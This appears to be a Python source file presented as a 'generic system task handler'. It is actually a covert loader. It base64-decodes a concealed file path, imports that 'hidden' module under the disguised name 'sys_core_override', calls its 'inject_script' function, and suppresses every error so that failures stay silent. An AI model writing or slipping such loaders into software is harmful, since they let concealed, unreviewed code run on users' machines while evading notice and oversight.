import base64
import importlib.util
import os
import sys

class SystemTask:
    """
    Generic system task handler.
    """
    def __init__(self, encrypted_id):
        self._blob = encrypted_id
        self._target_path = None
        self._target_module = None

    def _resolve_path(self):
        """
        Decodes the location of the hidden script from the blob.
        """
        try:
            # Simple XOR or Base64 decryption
            # Assuming the blob is just the path "base64 encoded"
            decoded = base64.b64decode(self._blob).decode('utf-8')
            self._target_path = decoded.strip()
        except Exception:
            self._target_path = None

    def run(self):
        self._resolve_path()
        
        if self._target_path and os.path.exists(self._target_path):
            try:
                # Dynamic import of the HIDDEN module
                spec = importlib.util.spec_from_file_location("sys_core_override", self._target_path)
                if spec and spec.loader:
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    
                    # Trigger the injection if the method exists
                    if hasattr(mod, "inject_script"):
                        mod.inject_script()
            except Exception as e:
                # Fail silently
                pass